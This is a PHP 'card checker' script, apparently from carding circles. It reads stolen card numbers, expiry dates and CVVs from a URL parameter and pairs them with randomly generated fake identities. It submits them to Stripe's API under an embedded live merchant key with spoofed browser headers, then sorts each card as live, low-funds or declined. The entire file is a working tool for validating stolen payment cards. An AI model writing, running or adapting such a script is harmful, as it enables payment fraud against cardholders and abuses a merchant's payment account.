<?php
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
#==============[Randomizing Details Api]
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$fname = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$lname = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$add = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$num = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];

#=====================[1st REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\"';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J810G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$fname.'+'.$lname.'&owner[email]='.$email.'&owner[phone]=6795142853&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=f2b4b29b-8a30-44e5-bbb9-291b47c087bb54627b&muid=0b144e11-653a-490e-9956-7881601172242628f6&sid=278f6684-0056-4975-bc48-0b8d8d77f220e20486&payment_user_agent=stripe.js%2F539dba3af%3B+stripe-js-v3%2F539dba3af&time_on_page=101488&key=pk_live_b59Mz8Rm1KIqD3iNMlJ9RgVY');
$result3 = curl_exec($ch);
#echo($result3);
$msg = trim(strip_tags(getStr($result3,'"message": "','"')));
#echo "MESSAGE: $msg<br><hr>";
#===============[Card Response]
if((strpos($result3,  '"status": "chargeable"'))) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Aprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>LIVE [@Itsvip_robot]</span></i></font>";
}
elseif
(strpos($result3,  "funds")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Aprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Insufficient Funds</span></i></font> <br><font class='badge badge-dark'>Message : $msg [@Itsvip_robot]";
}
elseif
(strpos($result3,  "security")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Ccn Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Ccn Live</span></i></font> <br><font class='badge badge-dark'>Message : $msg [@Itsvip_robot]";
}
elseif
(strpos($result3,"requires_action")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Reprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Message : 3d Secure Card. [@Itsvip_robot]";
}
else
{
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Reprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Message : $msg [@Itsvip_robot]";
}

curl_close($ch);
ob_flush();
?>
